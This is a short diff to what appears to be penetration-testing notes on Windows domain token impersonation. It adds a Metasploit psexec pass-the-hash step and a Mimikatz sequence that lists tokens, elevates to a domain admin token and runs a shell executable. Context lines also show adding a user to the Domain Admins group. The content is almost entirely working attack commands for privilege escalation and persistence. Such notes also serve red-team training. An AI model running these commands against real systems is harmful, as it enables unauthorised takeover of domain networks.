@@ -53,6 +53,7 @@ Temporary keys that allow you access to a system/network without having to provi
 
 Compromise the machine in domain to see if Administrator logins to that machine if yes perform this attack :
 
+using metasploit :
 ```bash
 #use pass the hash to get the shell
 msf6 exploit(windows/smb/psexec) > run
@@ -85,4 +86,14 @@ net group "Domain Admins" hawkeye /ADD /DOMAIN
 
 
 
+```
+
+using mimikatz.exe :
+
+```bash
+.\mimikatz.exe
+privilege::debug
+token::list
+token::elevate /domainadmin
+token::run /process:"C:\temp\shell.exe"
 ```
